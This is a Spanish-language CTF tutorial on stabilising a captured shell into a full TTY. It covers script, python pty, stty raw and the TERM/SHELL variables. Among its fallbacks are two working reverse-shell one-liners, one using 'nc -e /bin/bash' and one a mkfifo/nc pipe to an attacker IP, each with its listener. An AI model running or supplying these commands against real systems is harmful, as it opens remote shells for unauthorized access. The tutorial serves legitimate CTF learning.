
------------------

 >El tratamiento de la TTY por lo general no varia mucho en CTFs. Aunque, a veces solo son necesarios algunos pasos, mientras que a veces hay que prácticamente volver a hacer una terminal, lo mas usual es:
 
>Primero:
 
```bash
 script /dev/null -c bash
```
_Script solicita una PTY (Pseudo terminal) al kernel, luego, ejecuta en el proceso hijo que se crea, el comando que pasamos con la flag "-c", es decir una bash. Por ultimo, script no graba nada de la sesión al redirigirlo al /dev/null (Si no esta script disponible, puedes usar Python: python3 -c 'import pty; pty.spawn("/bin/bash")')._

>Ahora, con un CTRL+Z enviamos la Shell a segundo plano y desde nuestra terminal:

```bash
stty raw -echo; fg
```
1. _stty es la herramienta que nos ayudara a cambiar los parámetros de la terminal (eco, señales, etc.)
2. _raw es la flag que nos ayudara a desactivar el procesamiento de señales como CTRL+C (para que al hacerlo la shell no muera) o CTRL+Z (para no poner en segundo plano la shell por error)
3. _-echo Desactiva el echo del teclado, que nos puede dar problemas
4. _; fg (foreground) devuelve a primer plano nuestra querida Shell O.o

>Por ultimo vamos a establecer las variables de entorno correctas para una Shell totalmente funcional:

```bash
export TERM=xterm
export SHELL=/bin/bash
```
_Le estamos diciendo a la Shell que deseamos que la variable de entorno TERM (responsable de especificar el tipo de terminal usado), sea igual a Xterm.
Sí TERM está mal establecido en la máquina, cosas como clear, nano, vim, less, no funcionan correctamente. Y luego Establecemos /bin/bash como la Shell por defecto para que otras herramientas la usen.

>Como no siempre podemos seguir el paso a paso, aquí hay algunas alternativas si la terminal que obtenemos nos es muy limitada:

>_Si al ingresar a la maquina no podemos usar ni "script" ni "Python" para solicitar una Pseudo terminal al kernel:_

```bash
/bin/bash -i
```
_Si se puede, bash o sh son buenas alternativas, con la flag -i de "Interactive"_

```bash
perl -e 'exec "/bin/bash";'
```
_No tiene que ser Python, cualquier lenguaje interpretado (Como Perl) nos puede ayudar_

```bash
nc -e /bin/bash 172.17.0.1 1234
```
_En ultima instancia, cuando la Shell falle demasiado, podemos hacer una reverse Shell nuevamente con Netcat a nuestra IP por un puerto que no este en uso. Para ello primero debemos estar a la escucha desde nuestra maquina (nc -nlvp 1234)_

>_Si la anterior instancia con Netcat no funciona o no soporta la opción "-e", la tradicional es mas fiable:_

```bash
mkfifo /tmp/f; /bin/cat /tmp/f | /bin/bash -i 2>&1 | nc 172.17.0.1 1234 > /tmp/f
```
1. _Con "mkfifo" Podemos crear un archivo FIFO (Archivo especial que permite la comunicación entre procesos) en la ruta /tmp/f _
2. _Con "; /bin/cat /tmp/f" leemos el pipe (O archivo FIFO) que acabamos de crear con "cat".
3. Con "| /bin/bash -i" redirigimos el stdout o salida estándar del "cat" a una Shell interactiva como comando.
4. Con "2>&1" Redirigimos los errores o stder a la salida estándar o stdout (Para que también se muestren errores en la Shell que obtendremos)
5. Por ultimo, creamos una conexión con "nc" entre nuestra ip y la victima, redirigiendo todo lo que escribamos como atacantes al archivo /tmp/f de la maquina victima.
_Para resumirlo, estamos creando un archivo FIFO que será leído con "cat" y ejecutado con "/bin/bash" en la maquina victima, luego hacemos una conexión con "nc" entre nuestra IP atacante y el archivo FIFO en la IP victima, esta conexión nos da la posibilidad de escribir comandos en tal archivo, este los lee con cat y ejecuta con /bin/bash para luego devolver las respuestas de los comandos a la IP atacante. En pocas palabras, una comunicación bidireccional_

>_Si no podemos exportar variables de entorno normalmente por un "export" boqueado:_

```bash
TERM=xterm SHELL=/bin/bash /bin/bash -i
```
_Esta sintaxis hace exactamente lo mismo que buscamos lograr en un tratamiento de la TTY tradicional, pero, sin el export._

```bash
env TERM=xterm SHELL=/bin/bash /bin/bash
```
Si es necesario, podemos también usar del binario "env" (Cuando nos es permitido) para establecer variables de entorno TEMPORALMENTE